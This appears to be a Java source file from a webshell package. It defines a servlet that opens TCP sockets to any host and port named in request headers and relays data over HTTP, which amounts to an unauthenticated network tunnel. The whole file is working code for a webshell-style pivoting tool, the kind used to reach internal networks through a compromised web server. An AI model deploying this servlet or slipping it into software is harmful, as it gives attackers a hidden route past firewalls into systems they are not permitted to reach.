package webshell.servlet;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.io.IOUtils;

import webshell.util.SocketProxy;

@SuppressWarnings("serial")
public class SocketProxyServlet extends HttpServlet {

	private Map<String, SocketProxy> socketProxyMap = new HashMap<String, SocketProxy>();

	public SocketProxyServlet() {
		Thread t = new Thread() {
			@Override
			public void run() {
				while (true) {
					try {
						Thread.sleep(30000);
						removeUnused();
					} catch (InterruptedException e) {
					}
				}
			}
		};
		t.setName("socketProxyServlet-removeUnused");
		t.setDaemon(true);
		t.start();
	}

	@Override
	public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String fn = request.getHeader("fn");
		try {
			if ("open".equals(fn)) {
				open(request, response);
			} else if ("close".equals(fn)) {
				close(request, response);
			} else if ("write".equals(fn)) {
				write(request, response);
			} else if ("read".equals(fn)) {
				read(request, response);
			} else if ("closeOutput".equals(fn)) {
				closeOutput(request, response);
			}
		} catch (Exception e) {
			response.sendError(500, e.getMessage());
		}
	}

	private void open(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String key = request.getHeader("key");
		String host = request.getHeader("to_host");
		String port = request.getHeader("to_port");
		synchronized (socketProxyMap) {
			SocketProxy sp = socketProxyMap.get(key);
			if (sp != null) {
				sp.close();
			}
			sp = new SocketProxy(host, Integer.parseInt(port));
			socketProxyMap.put(key, sp);
		}
		response.setStatus(HttpServletResponse.SC_OK);
		response.getWriter().write("success");
		response.flushBuffer();
	}

	private void close(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String key = request.getHeader("key");
		synchronized (socketProxyMap) {
			SocketProxy sp = socketProxyMap.get(key);
			if (sp != null) {
				sp.close();
			}
			socketProxyMap.remove(key);
		}
		response.setStatus(HttpServletResponse.SC_OK);
		response.getWriter().write("success");
		response.flushBuffer();
	}

	private void write(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String key = request.getHeader("key");
		SocketProxy sp = socketProxyMap.get(key);
		if (sp == null) {
			throw new ServletException("SocketProxy closed.");
		} else {
			InputStream in = request.getInputStream();
			byte[] data = IOUtils.toByteArray(in);
			sp.write(data);
			response.setStatus(HttpServletResponse.SC_OK);
			response.getWriter().write("success");
			response.flushBuffer();
		}
	}

	private void closeOutput(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		String key = request.getHeader("key");
		SocketProxy sp = socketProxyMap.get(key);
		if (sp == null) {
			throw new ServletException("SocketProxy closed.");
		} else {
			sp.closeOutput();
			response.setStatus(HttpServletResponse.SC_OK);
			response.getWriter().write("success");
			response.flushBuffer();
		}
	}

	private void read(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String key = request.getHeader("key");
		SocketProxy sp = socketProxyMap.get(key);
		if (sp == null) {
			throw new ServletException("SocketProxy closed.");
		} else {
			byte[] data = null;
			for (int i = 0; i < 20; i++) {
				data = sp.readBuffer();
				if (data.length > 0) {
					break;
				}
				if (sp.isBufferEOF()) {
					response.addHeader("eof", "true");
					break;
				}
				try {
					Thread.sleep(500);
				} catch (InterruptedException e) {
				}
			}
			response.setStatus(HttpServletResponse.SC_OK);
			response.getOutputStream().write(data);
			response.flushBuffer();
		}
	}

	private void removeUnused() {
		synchronized (socketProxyMap) {
			List<String> keysToRemove = new ArrayList<String>();
			for (Map.Entry<String, SocketProxy> entry : socketProxyMap.entrySet()) {
				String key = entry.getKey();
				SocketProxy sp = entry.getValue();
				if (System.currentTimeMillis() - sp.getLastUsedTime() > 60000) {
					try {
						sp.close();
					} catch (IOException e) {
					}
					keysToRemove.add(key);
				}
			}
			for (String key : keysToRemove) {
				socketProxyMap.remove(key);
			}
		}
	}
}
